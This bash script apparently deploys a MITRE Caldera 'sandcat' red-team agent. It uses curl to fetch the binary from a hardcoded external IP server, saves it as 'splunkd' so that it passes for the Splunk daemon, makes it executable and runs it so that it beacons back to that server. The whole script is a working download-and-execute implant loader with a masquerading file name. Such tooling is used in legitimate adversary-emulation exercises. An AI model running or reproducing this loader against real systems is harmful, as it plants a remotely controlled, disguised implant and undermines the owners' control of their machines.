#!/bin/bash

team="red"
server="http://35.188.10.229:8888"
[[ "$CALDERA_TEAM" != "" ]] && team="$CALDERA_TEAM"
[[ "$CALDERA_SRV" != "" ]] && server="$CALDERA_SRV"

echo "Starting Caldera Agent => Team:$team, Server=$server"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd
chmod +x splunkd
./splunkd -server $server -group $team -v
